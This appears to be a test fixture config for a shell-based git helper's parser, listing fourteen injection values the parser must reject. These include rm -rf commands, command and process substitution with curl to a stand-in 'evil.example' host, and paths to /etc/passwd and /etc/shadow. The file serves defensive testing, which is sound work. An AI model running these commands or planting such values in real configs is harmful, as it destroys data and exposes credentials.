# tcs-git-helpers malicious config — injection attempts that the parser
# MUST refuse to evaluate per ADR-3 (printf -v strict allowlist; no eval/source).
# Reference: research/security.md §4 MUST-reject corpus.
#
# Each line is an injection vector. The parser MUST treat the value as a
# literal string (or reject it) — NEVER execute it.

# 1. Command substitution via $()
TCS_PROTECTED_BRANCHES=$(rm -rf ~)

# 2. Command substitution via backticks
TCS_PROTECTED_BRANCHES=`rm -rf /`

# 3. Newline injection: smuggling a second key on the same physical line
TCS_PROTECTED_BRANCHES=main\nMALICIOUS=1

# 4. Embedded literal newline before next directive
TCS_PROTECTED_BRANCHES="main
TCS_REQUIRE_SCOPE=1"

# 5. Path traversal in path-typed key
TCS_HOOK_EXCLUDE_PATHS_FILE=../../etc/passwd

# 6. Absolute path outside repo (path key)
TCS_HOOK_EXCLUDE_PATHS_FILE=/etc/shadow

# 7. Variable expansion attempt
TCS_PROTECTED_BRANCHES=$HOME

# 8. ANSI-C $'...' quoting (could smuggle escapes)
TCS_PROTECTED_BRANCHES=$'main\nrm -rf /'

# 9. Process substitution
TCS_PROTECTED_BRANCHES=<(curl evil.example/payload)

# 10. Here-string injection attempt
TCS_PROTECTED_BRANCHES=main<<<$(id)

# 11. Semicolon-chained command
TCS_PROTECTED_BRANCHES=main;rm -rf /

# 12. Pipe-chained command (looks legitimate due to TCS_PROTECTED_BRANCHES delimiter)
TCS_PROTECTED_BRANCHES=main|$(curl evil)

# 13. Glob-expanding path
TCS_HOOK_EXCLUDE_PATHS_FILE=/etc/*

# 14. NUL-byte smuggle (non-printable; should reject before assignment)
TCS_PROTECTED_BRANCHES=main\x00rm
